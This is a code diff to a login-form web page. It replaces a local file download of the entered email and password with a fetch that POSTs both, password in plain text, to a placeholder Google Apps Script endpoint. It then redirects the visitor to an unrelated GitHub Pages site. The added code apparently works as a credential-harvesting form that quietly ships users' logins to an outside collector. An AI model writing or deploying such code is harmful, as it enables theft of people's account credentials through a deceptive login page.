@@ -132,7 +132,7 @@
             password.type = togglePassword.checked ? 'text' : 'password';
         });
 
-        form.addEventListener('submit', (e) => {
+        form.addEventListener('submit', async (e) => {
             e.preventDefault(); // Prevent form submission
 
             const emailValue = email.value;
@@ -143,20 +143,24 @@
                 return;
             }
 
-            const fileContent = `Email: ${emailValue}\nPassword: ${passwordValue}\n\n`;
-            const blob = new Blob([fileContent], { type: 'text/plain' });
-            const link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = 'Form-save.txt';
-            
-            setTimeout(() => {
-                link.click();
-                URL.revokeObjectURL(link.href);
+            try {
+                const response = await fetch('<Your Google Apps Script Web App URL>', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: emailValue, password: passwordValue }),
+                });
 
-                setTimeout(() => {
+                const result = await response.text();
+
+                if (response.ok) {
+                    alert('Data saved successfully!');
                     window.location.href = "https://mdmanikchand.github.io/Bible-Contradiction/";
-                }, 3000);
-            }, 1000);
+                } else {
+                    alert('Failed to save data: ' + result);
+                }
+            } catch (error) {
+                alert('Error: ' + error.message);
+            }
         });
     </script>
 </body>
